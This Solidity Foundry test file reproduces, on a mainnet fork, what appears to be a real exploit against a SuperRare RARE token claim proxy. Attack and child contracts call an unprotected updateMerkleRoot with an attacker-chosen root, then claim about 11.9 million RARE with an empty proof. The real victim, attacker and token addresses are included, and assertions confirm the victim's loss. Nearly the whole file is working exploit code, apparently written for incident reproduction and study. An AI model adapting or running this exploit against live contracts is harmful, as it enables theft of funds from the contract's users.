
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 23016422;
    uint256 constant TX_TIMESTAMP = 1753690919;
    uint256 constant TX_BLOCK_NUMBER = 23016423;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        SuperRareAttack attack = _installAttack();
        _prepareProfit(attack);
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _installAttack() internal returns (SuperRareAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = SuperRareAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new SuperRareAttack();
        }
        _etchChildRuntime();
        _bindAttackChild(attack);
    }

    function _prepareProfit(SuperRareAttack attack) internal {
        _prepareProfit(address(attack), Addresses.CLAIM_ATTACK_CHILD);
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(SuperRareAttack).runtimeCode);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.CLAIM_ATTACK_CHILD, type(ClaimAttackChild).runtimeCode);
    }

    function _bindAttackChild(SuperRareAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.ERC1967_PROXY,
                asset: Addresses.RARE_6350,
                symbol: "RARE",
                oracleKind: "victim_loss",
                expectPositive: false,
                expectedDeltaRaw: 11907874713019104529057960,
                balancerInternalBalance: false
            })
        );
    }
}

contract SuperRareAttack {
    ClaimAttackChild public attackChild;

    function _bindChild() internal {
        if (address(attackChild) == address(0)) {
            attackChild = ClaimAttackChild(payable(Addresses.CLAIM_ATTACK_CHILD));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindChild();
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) _bindChild();
        _runClaimFlow();
    }

    function _runClaimFlow() internal {
        _prepareChild();
        _readStakingBalance();
        _readChildBalance();
        _executeChildClaim();
    }

    function _prepareChild() internal view {
        require(address(attackChild).code.length != 0, "attack child runtime missing");
        ClaimAttackChild(payable(address(attackChild))).prepareClaimChild();
    }

    function _readStakingBalance() internal {
        ClaimAttackChild(payable(address(attackChild))).getStakingContractBalance();
    }

    function _readChildBalance() internal {
        ClaimAttackChild(payable(address(attackChild))).getTokenBalance();
    }

    function _executeChildClaim() internal {
        ClaimAttackChild(payable(address(attackChild))).claimWithRoot();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == SuperRareAttack.attack.selector) {
            _runClaimFlow();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = ClaimAttackChild(payable(Addresses.CLAIM_ATTACK_CHILD));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = ClaimAttackChild(payable(attackChildAddress));
    }
}

contract ClaimAttackChild {
    uint256 internal constant CLAIM_AMOUNT = 11907874713019104529057960;
    bytes32 internal constant CLAIM_ROOT = 0x93f3c0d0d71a7c606fe87524887594a106b44c65d46fa72a42d80bd6259ade7e;
    bytes4 internal constant CLAIM_CALLBACK = 0x643a0e92;

    receive() external payable {}

    function getTokenBalance() external payable {
        _readChildRare();
        _returnUint(0);
    }

    function getStakingContractBalance() external payable {
        _readProxyRare();
        _returnUint(CLAIM_AMOUNT);
    }

    fallback() external payable {
        if (msg.sig == CLAIM_CALLBACK) {
            _claimWithRoot();
            return;
        }
        _entryCb();
    }

    function claimWithRoot() external payable {
        _claimWithRoot();
        return;
    }

    function getBalance() external payable {
        _readChildRare();
        _returnUint(0);
    }

    function getBalance2() external payable {
        _readProxyRare();
        _returnUint(CLAIM_AMOUNT);
    }

    function _entryCb() internal {}

    function _claimWithRoot() internal {
        _readProxyRare();
        _updateMerkleRoot();
        _claimRare();
    }

    function _readProxyRare() internal view {
        IERC20Like(Addresses.RARE_6350).balanceOf(Addresses.ERC1967_PROXY);
    }

    function _updateMerkleRoot() internal {
        IERC1967Proxy(Addresses.ERC1967_PROXY).updateMerkleRoot(CLAIM_ROOT);
    }

    function _claimRare() internal {
        bytes32[] memory proof = new bytes32[](0);
        IERC1967Proxy(Addresses.ERC1967_PROXY).claim(CLAIM_AMOUNT, proof);
    }

    function _readChildRare() internal view {
        IERC20Like(Addresses.RARE_6350).balanceOf(address(this));
    }

    function _returnUint(uint256 amount) internal pure {
        bytes memory ret = abi.encode(amount);
        assembly {
            return(add(ret, 32), mload(ret))
        }
    }

    function prepareClaimChild() public view {
        IERC1967Proxy(Addresses.ERC1967_PROXY).token();
    }
}

library Addresses {
    address internal constant CLAIM_ATTACK_CHILD = 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab;
    address internal constant ATTACK_CONTRACT = 0x2073111E6Ebb6826F7e9c6192C6304Aa5aF5E340;
    address internal constant ERC1967_PROXY = 0x3f4D749675B3e48bCCd932033808a7079328Eb48;
    address internal constant ATTACKER_EOA = 0x5B9B4B4DaFbCfCEEa7aFbA56958fcBB37d82D4a2;
    address internal constant RARE_6350 = 0xba5BDe662c17e2aDFF1075610382B9B691296350;
}

interface IERC1967Proxy {
    function claim(uint256, bytes32[] calldata) external;
    function token() external view returns (uint256);
    function updateMerkleRoot(bytes32) external;
}
